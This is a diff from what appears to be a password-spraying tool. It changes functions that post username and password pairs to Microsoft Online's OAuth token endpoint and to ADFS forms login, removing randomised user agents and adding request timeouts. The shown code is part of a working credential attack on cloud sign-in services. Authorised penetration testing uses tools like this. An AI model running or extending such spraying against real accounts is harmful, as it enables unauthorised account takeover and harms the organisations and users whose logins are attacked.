@@ -111,8 +111,8 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                     'Content-Type': 'application/x-www-form-urlencoded',
                 }
 
-                session = make_session(random_ua=True)
-                r = session.post(f"{target}/common/oauth2/token", headers=headers, data=body)
+                session = make_session()
+                r = session.post(f"{target}/common/oauth2/token", headers=headers, data=body, timeout=5)
                 ip = get_public_ip(timeout=5, retries=2)
 
                 if r.status_code == 200:
@@ -256,14 +256,14 @@ def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                                  "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                     post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                         'AuthMethod': 'FormsAuthentication'}).encode('ascii')
-                    session = make_session(random_ua=True)
+                    session = make_session()
                     session.auth = (username, password)
                     
                     try:
                         response = session.post(target_url, data=post_data, allow_redirects=False,
                                             headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
-                                                               'image/webp,*/*;q=0.8'})
+                                                               'image/webp,*/*;q=0.8'}, timeout=5)
                         sent_headers = response.request.headers
                         LOGGER.debug(f"Sent headers: {sent_headers}")
                         status_code = response.status_code
